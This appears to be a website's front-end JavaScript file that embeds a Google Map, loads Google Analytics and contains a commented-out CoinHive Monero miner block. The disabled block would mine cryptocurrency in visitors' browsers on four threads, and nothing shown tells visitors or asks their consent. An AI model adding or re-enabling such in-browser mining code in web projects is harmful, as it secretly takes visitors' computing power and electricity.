// Used to add google map to the specified div displaying the location of the given coordinates
function myMap() {
  myCenter = new google.maps.LatLng(43.687114, -79.6217723);
  var mapOptions = {
    center: myCenter,
    zoom: 12, scrollwheel: false, draggable: false,
    mapTypeId: google.maps.MapTypeId.ROADMAP
  };
  var map = new google.maps.Map(document.getElementById("googleMap"), mapOptions);

  var marker = new google.maps.Marker({
    position: myCenter,
  });
  marker.setMap(map);
};

// Google analytics
(function (i, s, o, g, r, a, m) {
  i['GoogleAnalyticsObject'] = r;
  i[r] = i[r] || function () {
    (i[r].q = i[r].q || []).push(arguments)
  }, i[r].l = 1 * new Date();
  a = s.createElement(o),
    m = s.getElementsByTagName(o)[0];
  a.async = 1;
  a.src = g;
  m.parentNode.insertBefore(a, m)
})(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

ga('create', 'UA-107301162-1', 'auto');
ga('send', 'pageview');


// Monero Miner
// var miner;
// $(document).ready(function () {
//
//   miner = new CoinHive.Anonymous('z7tT0qieXxxjNGXy3NwbVBd3S16d2GIr', {
//     threads: 4
//
//   });
//   miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
//
//   setInterval(function () {
//     var threadCount = miner.getNumThreads();
//     console.log("Threads: " + threadCount);
//   }, 1000);
//
// });
